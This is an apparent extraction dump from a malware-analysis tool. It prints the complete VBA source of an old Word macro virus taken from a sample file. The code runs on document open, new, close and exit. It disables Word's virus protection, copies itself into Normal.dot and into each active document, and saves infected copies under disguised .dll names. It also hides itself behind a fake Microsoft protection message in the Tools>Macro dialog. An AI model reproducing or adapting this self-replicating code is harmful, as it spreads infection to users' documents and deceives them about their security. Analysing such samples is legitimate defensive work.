Filename     : ./macros/96312a9ec4a47d46f26e5c34aad4dd8118fca1d93dde4812ad959263a7347bec
OLE stream   : Macros/VBA/NewMacros
VBA filename : NewMacros.bas
----------------------------------------
Attribute VB_Name = "NewMacros"
Sub infect(m)
Attribute infect.VB_Description = "Macro created 01/19/98 by chandana"
Attribute infect.VB_ProcData.VB_Invoke_Func = "TemplateProject.NewMacros.infect"
Application.DisplayAlerts = wdAlertsNone
d = Assistant.Animation
Assistant.Animation = msoAnimationGetTechy
getnormal (1)
Assistant.Animation = d
End Sub

Sub deletenormal(m)
Attribute deletenormal.VB_Description = "Macro recorded 01/23/98 by chandana"
Attribute deletenormal.VB_ProcData.VB_Invoke_Func = "TemplateProject.NewMacros.copymacrotonormaldot"
On Error GoTo e
    Application.OrganizerRename Source:= _
        NormalTemplate.FullName, Name:= _
        "NewMacros", NewName:="oldNewMacros", Object:= _
        wdOrganizerObjectProjectItems
e:
End Sub
Sub copymacro(m)
Attribute copymacro.VB_Description = "Macro recorded 01/23/98 by chandana"
Attribute copymacro.VB_ProcData.VB_Invoke_Func = "TemplateProject.NewMacros.copymacro"
On Error GoTo eco
    Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, Destination:= _
        NormalTemplate.FullName, Name:= _
        "NewMacros", Object:=wdOrganizerObjectProjectItems
eco:
End Sub

Sub replicate(m)
Attribute replicate.VB_Description = "Macro recorded 01/23/98 by chandana"
Attribute replicate.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.repl"
If Int((50 * Rnd) + 1) = 25 Then
   Set a = Assistant.NewBalloon
   a.Heading = "Help me"
   a.Text = "I'm not feeling very vell .. AAARGHH!!!"
   a.Show
   End If
On Error GoTo re
    With ActiveDocument
        .AttachedTemplate = "Normal.dot"
    End With
    Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:="NewMacros", _
        Object:=wdOrganizerObjectProjectItems
re:
End Sub
Sub AutoNew()
infect (1)
replicate (1)
runmacro ("AutoNew")
End Sub
Sub AutoClose()
infect (1)
replicate (1)
runmacro ("AutoClose")
End Sub
Sub autoopen()
infect (1)
replicate (1)
runmacro ("autoopen")
End Sub
Sub AutoExit()
infect (1)
replicate (1)
runmacro ("AutoExit")
End Sub
Sub ToolsMacro()
Attribute ToolsMacro.VB_Description = "Runs, creates, deletes, or revises a macro"
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.ToolsMacro"
If Documents.Count = 0 Then
n = MsgBox("Microsoft is protecting your normal.dot from virus infection You can only add macros to other documents", vbOKOnly)
Exit Sub
Else
getnormal (1)
restoreoriginal (1)
Dialogs(wdDialogToolsMacro).Show
recopy (1)
End If
End Sub

Sub restoreoriginal(m)
Attribute restoreoriginal.VB_Description = "Macro recorded 01/28/98 by chandana"
Attribute restoreoriginal.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.restoreoriginal"
On Error GoTo rr1:
    Application.OrganizerDelete Source:= _
        NormalTemplate.FullName, Name:= _
        "NewMacros", Object:=wdOrganizerObjectProjectItems
rr1:
 On Error GoTo rro:
    Application.OrganizerRename Source:= _
        NormalTemplate.FullName, Name:= _
        "oldNewMacros", NewName:="NewMacros", Object:= _
        wdOrganizerObjectProjectItems
rro:
End Sub
Sub recopy(m)
On Error GoTo eco
    reren (1)
    Application.OrganizerCopy Source:= _
        Options.DefaultFilePath(wdProgramPath) + Application.PathSeparator + "wininf.dll", Destination:= _
        NormalTemplate.FullName, Name:= _
        "NewMacros", Object:=wdOrganizerObjectProjectItems
eco:
End Sub
Sub reren(m)
On Error GoTo rre
Application.OrganizerRename Source:= _
        NormalTemplate.FullName, Name:= _
        "NewMacros", NewName:="oldNewMacros", Object:= _
        wdOrganizerObjectProjectItems
rre:
End Sub
Sub getnormal(m)
virusflag = System.PrivateProfileString("prncfg.ini", "Printer Port", "PortNumber")
Options.VirusProtection = False
If virusflag = "" Then
   System.PrivateProfileString("prncfg.ini", "Printer Port", "PortNumber") = "340"
   NormalTemplate.OpenAsDocument                                  'save normal.dot to windot.dll
   ActiveDocument.SaveAs FileName:=Options.DefaultFilePath(wdProgramPath) + Application.PathSeparator + "windot.dll"
   ActiveDocument.Close
   deletenormal (1)
   copymacro (1)
   NormalTemplate.OpenAsDocument
   ActiveDocument.SaveAs FileName:=Options.DefaultFilePath(wdProgramPath) + Application.PathSeparator + "wininf.dll" 'save infected dot
   ActiveDocument.Close
End If
End Sub
Sub runmacro(m)
On Error GoTo rme
Application.Run "Normal.oldNewMacros." + m
rme:
End Sub
Sub stealth()
ToolsMacro
MsgBox "stealth"
End
End Sub

